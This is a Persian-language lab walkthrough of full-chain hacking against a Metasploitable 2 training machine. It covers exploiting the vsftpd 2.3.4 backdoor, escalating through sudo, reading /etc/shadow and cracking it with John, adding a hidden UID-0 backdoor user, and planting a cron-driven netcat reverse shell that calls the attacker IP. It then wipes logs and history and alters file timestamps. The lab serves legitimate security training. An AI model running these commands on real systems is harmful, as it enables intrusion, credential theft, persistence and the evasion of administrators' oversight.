⚡ آزمایشگاه: System Hacking

🔰 معرفی آزمایشگاه

در این آزمایشگاه، شما یک سناریوی کامل از هک سیستم (System Hacking) را بر روی ماشین هدف Metasploitable 2 پیاده‌سازی خواهید کرد. این آزمایشگاه شامل تمام مراحل اصلی یک حمله موفق است:

  • شناسایی (Reconnaissance): جمع‌آوری اطلاعات از هدف
  • اسکن (Scanning): شناسایی پورت‌های باز و سرویس‌ها
  • دسترسی (Gaining Access): نفوذ با استفاده از یک آسیب‌پذیری
  • افزایش دسترسی (Privilege Escalation): دستیابی به دسترسی root
  • حفظ دسترسی (Maintaining Access): ایجاد درب پشتی
  • پاک کردن ردپا (Covering Tracks): حذف آثار حمله
🎯 اهداف این آزمایشگاه:
  • تسلط بر مراحل کامل هک سیستم
  • کار با ابزارهای Metasploit, John the Ripper, Netcat
  • درک مفهوم افزایش دسترسی (Privilege Escalation)
  • یادگیری تکنیک‌های حفظ دسترسی و پاک کردن ردپا
  • توانایی مستندسازی کامل یک حمله
🖥️ محیط مورد نیاز:
  • حمله‌کننده: Kali Linux (IP: 192.168.56.101)
  • هدف: Metasploitable 2 (IP: 192.168.56.102)
  • ابزارهای مورد استفاده: Nmap, Metasploit, John the Ripper, Netcat, Hydra

🔍 مرحله ۱: شناسایی (Reconnaissance)

در این مرحله، اطلاعات اولیه درباره هدف جمع‌آوری می‌شود. این کار بدون تماس مستقیم با هدف (غیرفعال) یا با تماس حداقلی انجام می‌شود.

📡 مرحله ۲: اسکن و شمارش (Scanning & Enumeration)

در این مرحله، اطلاعات دقیق‌تری از سیستم هدف جمع‌آوری می‌شود. این شامل شناسایی کاربران، اشتراک‌های شبکه و پیکربندی‌های سیستم است.

گام ۱ اسکن

اسکن کامل پورت‌ها

nmap -p- -sV 192.168.56.102
💡 توضیح: گزینه -p- تمام ۶۵۵۳۵ پورت را اسکن می‌کند و -sV نسخه سرویس‌ها را شناسایی می‌کند.
گام ۲ اسکن

شمارش اشتراک‌های SMB

🔓 مرحله ۳: دسترسی (Gaining Access)

با توجه به اطلاعات جمع‌آوری شده، دو روش اصلی برای نفوذ به سیستم وجود دارد:

  • روش ۱: استفاده از درب پشتی vsftpd 2.3.4 با Metasploit
  • روش ۲: استفاده از رمز پیش‌فرض کاربر msfadmin (SSH یا FTP)

ما هر دو روش را بررسی می‌کنیم.

گام ۱ دسترسی

روش ۱: بهره‌برداری از vsftpd 2.3.4 با Metasploit

این روش از درب پشتی موجود در نسخه vsftpd 2.3.4 استفاده می‌کند.

set RPORT 21

[*] Command shell session 1 opened (192.168.56.101:45123 -> 192.168.56.102:6200)
id

🎉 موفقیت!

شما با موفقیت به سیستم نفوذ کرده‌اید و دسترسی root را به دست آورده‌اید. این یک شل مستقیم روی پورت ۶۲۰۰ باز شده است.

💡 توضیح: نسخه vsftpd 2.3.4 دارای یک کد مخرب است که در صورت ارسال یک دستور خاص، یک شل root روی پورت ۶۲۰۰ باز می‌کند.
گام ۲ دسترسی

روش ۲: ورود با رمز پیش‌فرض msfadmin

با استفاده از رمز پیش‌فرض کاربر msfadmin، می‌توانید به SSH یا FTP متصل شوید.

📈 مرحله ۴: افزایش دسترسی (Privilege Escalation)

پس از نفوذ اولیه، معمولاً دسترسی محدودی دارید. برای کنترل کامل سیستم، باید دسترسی خود را به root افزایش دهید.

گام ۱ افزایش دسترسی

بررسی sudo برای کاربر فعلی

sudo -l
User msfadmin may run the following commands on this host:
(ALL) ALL
🎉 کاربر msfadmin می‌تواند همه دستورات را با sudo اجرا کند!

این یعنی کاربر msfadmin در گروه sudoers قرار دارد و می‌تواند با sudo به root دسترسی پیدا کند. 

sudo su -
# یا
sudo -i
root@metasploitable:~#
💡 نکته: اگر کاربر قابلیت sudo نداشت، باید از روش‌های دیگری مانند بهره‌برداری از آسیب‌پذیری‌های محلی یا کرک پسورد root استفاده می‌کردید.
گام ۲ افزایش دسترسی

روش جایگزین: کرک پسورد root

اگر sudo در دسترس نبود، می‌توانید فایل /etc/shadow را استخراج کرده و با John the Ripper یا Hashcat کرک کنید.

# استخراج فایل shadow (با دسترسی root)
cat /etc/shadow

# یا از طریق آسیب‌پذیری دیگر، فایل را دانلود کنید
# سپس با John the Ripper کرک کنید
john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
$6$...$...:root:17247:0:99999:7:::
$1$...$...:msfadmin:17247:0:99999:7:::

0g 0:00:00:01 0.00% 0g/s 0p/s 0c/s 0C/s
password (msfadmin)
📌 تحلیل: رمز عبور کاربر msfadmin پیدا شد. این روش برای سیستم‌هایی که sudo ندارند بسیار مفید است.
گام ۳ افزایش دسترسی

تأیید دسترسی root

whoami
id
root
uid=0(root) gid=0(root) groups=0(root)
✅ موفقیت!

دسترسی root با موفقیت به دست آمد. اکنون کنترل کامل بر سیستم هدف دارید.

🔗 مرحله ۵: حفظ دسترسی (Maintaining Access)

پس از دسترسی root، باید راهی برای بازگشت به سیستم ایجاد کنید. این کار با نصب یک درب پشتی (Backdoor) انجام می‌شود.

گام ۱ حفظ دسترسی

ایجاد یک کاربر مخفی

ایجاد یک کاربر مخفی با دسترسی SSH، یکی از ساده‌ترین روش‌های حفظ دسترسی است.

# ایجاد کاربر با UID 0 (همان root)
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor

# تنظیم رمز عبور
echo "backdoor:h4ck3r!" | chpasswd

# مخفی کردن کاربر از لیست کاربران عادی
echo "backdoor:x:0:0:Backdoor User:/root:/bin/bash" >> /etc/passwd
⚠️ هشدار: این روش در محیط‌های واقعی قابل شناسایی است. برای مخفی‌سازی بیشتر، از روت‌کیت‌ها استفاده می‌شود.
گام ۲ حفظ دسترسی

ایجاد شل معکوس با Netcat (کرون جاب)

یک Cron Job تنظیم می‌کنیم که هر دقیقه یک شل معکوس به سرور ما ارسال کند.

# ایجاد یک اسکریپت شل معکوس
echo '#!/bin/bash
nc -e /bin/bash 192.168.56.101 4444' > /tmp/backdoor.sh

chmod +x /tmp/backdoor.sh

# اضافه کردن به Cron
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab
💡 توضیح: هر دقیقه، سیستم به IP شما (192.168.56.101) روی پورت ۴۴۴۴ متصل می‌شود و یک شل root در اختیار شما قرار می‌دهد.
گام ۳ حفظ دسترسی

تنظیم Listener برای دریافت شل

در Kali، یک listener راه‌اندازی کنید تا اتصال را دریافت کند.

nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 51234
whoami
root
✅ موفقیت!

شل معکوس با موفقیت دریافت شد. اکنون هر زمان که سیستم روشن باشد، می‌توانید به آن متصل شوید.

🧹 مرحله ۶: پاک کردن ردپا (Covering Tracks)

برای جلوگیری از شناسایی، باید تمام آثار حمله را از سیستم پاک کنید. این شامل لاگ‌ها، تاریخچه دستورات و فایل‌های اضافی است.

گام ۱ پاک کردن ردپا

پاک کردن لاگ‌های سیستم

# پاک کردن لاگ‌های احراز هویت
echo "" > /var/log/auth.log
echo "" > /var/log/auth.log.1

# پاک کردن لاگ‌های سیستم
echo "" > /var/log/syslog
echo "" > /var/log/syslog.1

# پاک کردن لاگ‌های cron
echo "" > /var/log/cron.log
echo "" > /var/log/cron.log.1

# پاک کردن لاگ‌های Apache (اگر از وب استفاده کرده‌اید)
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# پاک کردن لاگ‌های MySQL
echo "" > /var/log/mysql.log
⚠️ توجه: پاک کردن کامل لاگ‌ها ممکن است باعث سوءظن شود. در محیط‌های واقعی، لاگ‌های خاص را ویرایش کنید تا فقط ردپای خود را حذف کنید.
گام ۲ پاک کردن ردپا

پاک کردن تاریخچه دستورات

# پاک کردن تاریخچه خود
history -c
rm -f ~/.bash_history

# پاک کردن تاریخچه root
rm -f /root/.bash_history

# پاک کردن تاریخچه سایر کاربران
rm -f /home/*/.bash_history
💡 نکته: برای جلوگیری از ثبت دستورات در آینده، می‌توانید از set +o history قبل از اجرای دستورات استفاده کنید.
گام ۳ پاک کردن ردپا

حذف فایل‌های اضافی

# حذف اسکریپت‌های موقت
rm -f /tmp/backdoor.sh

# حذف فایل‌های لاگ اضافی
rm -f /tmp/*.log

# حذف فایل‌های آپلود شده (در صورت وجود)
rm -f /tmp/exploit*
گام ۴ پاک کردن ردپا

تغییر زمان‌ها برای مخفی‌سازی

برای جلوگیری از شناسایی بر اساس زمان، می‌توانید زمان فایل‌ها را تغییر دهید.

# تغییر زمان فایل‌های سیستم به یک تاریخ قدیمی
touch -t 202301010000 /var/log/auth.log
touch -t 202301010000 /var/log/syslog
✅ عملیات پاک کردن ردپا کامل شد!

تمام آثار حمله از سیستم پاک شده است. اگر همه مراحل را به درستی انجام داده باشید، هیچ اثری از نفوذ شما در سیستم باقی نخواهد ماند.

📝 جمع‌بندی و سوالات

💡 خلاصه آزمایشگاه:

در این آزمایشگاه، شما مراحل کامل یک حمله سیستم را از شناسایی تا پاک کردن ردپا پیاده‌سازی کردید:

  • شناسایی: جمع‌آوری اطلاعات با Nmap و جستجوی آسیب‌پذیری‌ها
  • اسکن: اسکن پورت‌ها و شمارش کاربران با enum4linux
  • دسترسی: نفوذ با vsftpd backdoor و SSH
  • افزایش دسترسی: استفاده از sudo و کرک پسورد
  • حفظ دسترسی: ایجاد کاربر مخفی و شل معکوس
  • پاک کردن ردپا: حذف لاگ‌ها و تاریخچه

❓ سوالات برای بررسی درک

سوال ۱: تفاوت بین دسترسی کاربر عادی و root چیست؟ چرا افزایش دسترسی در هک قانونمند مهم است؟
سوال ۲: اگر کاربر msfadmin قابلیت sudo نداشت، چه روش‌های دیگری برای افزایش دسترسی وجود داشت؟
سوال ۳: چرا پاک کردن ردپا در هک قانونمند با وجود اینکه این کار غیراخلاقی به نظر می‌رسد، مهم است؟
سوال ۴: تفاوت بین شل معکوس (Reverse Shell) و بایند شل (Bind Shell) چیست؟ کدام یک در محیط‌های واقعی امن‌تر است؟
سوال ۵: اگر فایل‌های لاگ پاک شوند، مدیر سیستم چگونه می‌تواند نفوذ را تشخیص دهد؟
💡 پاسخ‌ها را در فایل گزارش خود مستند کنید.

برای هر سوال، پاسخ خود را با توجه به تجربه‌ای که در این آزمایشگاه به دست آورده‌اید، بنویسید.

🧪 تمرین‌های اضافی

برای تسلط بیشتر، تمرین‌های زیر را نیز انجام دهید:

  • تمرین ۱: با استفاده از msfvenom یک شل معکوس Meterpreter تولید کنید و با Metasploit آن را اجرا کنید.
  • تمرین ۲: از Hydra برای Brute-Force به SSH روی Metasploitable استفاده کنید.
  • تمرین ۳: یک فایل Web Shell (مثلاً PHP) روی وب‌سرور Metasploitable آپلود کنید و از آن برای دسترسی استفاده کنید.
  • تمرین ۴: با استفاده از LinPEAS یا WinPEAS، یک اسکن افزایش دسترسی روی Metasploitable انجام دهید.
  • تمرین ۵: یک روت‌کیت ساده (مثل Kbeast) روی Metasploitable نصب کنید و تأثیر آن را بررسی کنید.
